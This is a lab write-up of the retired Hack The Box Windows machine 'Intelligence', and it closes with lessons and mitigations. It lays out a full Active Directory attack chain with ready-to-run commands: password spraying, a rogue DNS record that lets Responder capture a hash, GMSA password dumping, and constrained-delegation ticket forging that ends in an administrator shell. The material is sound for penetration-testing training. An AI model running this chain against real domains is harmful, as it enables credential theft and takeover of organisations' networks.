---
machine: Intelligence
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, ad, dns, responder, gmsa, delegation]
---

# Intelligence — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Published PDFs leak usernames and a default password for new accounts. After spraying it, `Tiffany.Molina` gains SMB access and finds a script that visits every `web*` DNS record every five minutes with credentials. A malicious DNS record lets Responder capture `Ted.Graves`'s hash, and his group can read `svc_int`'s GMSA. That account has delegation on the DC.

## Recon

```bash
nmap -Pn -sCV -p53,80,88,135,139,389,445,464,636,3268,3269,9389 <IP>
```

- `53/tcp` DNS, `88/tcp` Kerberos, `389/tcp` LDAP and `445/tcp` SMB: this is a domain controller.
- `80/tcp` IIS with a corporate site and `/documents/` containing PDFs.
- The domain is `intelligence.htb` and the DC is `dc.intelligence.htb`.

## Enumeration

- PDF metadata reveals users such as `William.Lee` and `Jose.Williams`.
- The `YYYY-MM-DD-upload.pdf` pattern allows enumerating unlinked documents.
- One PDF announces a common initial password for new employees.

## Foothold

Validate the pattern with `kerbrute` and spray the initial password across all users. `Tiffany.Molina` works and grants access to the `Users` and `IT` shares; `IT` contains `downdetector.ps1`.

```bash
kerbrute userenum --dc <IP> -d intelligence.htb users.txt
crackmapexec smb <IP> -u users.txt -p '<DEFAULT_PASSWORD>' -d intelligence.htb
smbclient -U Tiffany.Molina //<IP>/IT
```

## Lateral movement

The script reads DNS records starting with `web` and calls `Invoke-WebRequest` with the executing user's credentials. Add a `web-<X>` record pointing to the attacker and Responder captures `Ted.Graves`'s Net-NTLMv2 hash. `hashcat -m 5600` cracks it, and `Ted.Graves` is in IT Support, which can read `svc_int`'s password.

## Privilege escalation

Extract `svc_int`'s GMSA password with `gMSADumper` and use its hash to request an S4U2self/S4U2Proxy ticket with `getST.py`, since the account has delegation on the DC. Then run `wmiexec` with the `administrator` ticket.

```bash
python3 gMSADumper.py -u Ted.Graves -p '<PASSWORD>' -l <IP> -d intelligence.htb
getST.py -dc-ip <IP> -spn www/dc.intelligence.htb -hashes :<HASH> -impersonate administrator intelligence.htb/svc_int
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```

## Evidence

- PDFs with usernames and the initial password.
- SMB session as `Tiffany.Molina` and `downdetector.ps1`.
- `Ted.Graves` hash, `svc_int` GMSA and an administrator shell.

## Lessons learned

- Public document metadata leaks accounts and internal policies.
- A shared initial password enables domain-wide spraying.
- DNS records and scheduled scripts can send credentials to a controlled host.

## Mitigation and detection

- Do not use a shared initial password; enforce reset and MFA.
- Restrict DNS record creation and monitor `web*` queries.
- Review scheduled scripts using credentials and limit delegation.

## References

- [0xdf — Intelligence](https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html)
- [IppSec — Intelligence](https://www.youtube.com/watch?v=Jg_BjkxdtsE)
- [Hack The Box — Intelligence](https://app.hackthebox.com/machines/intelligence)
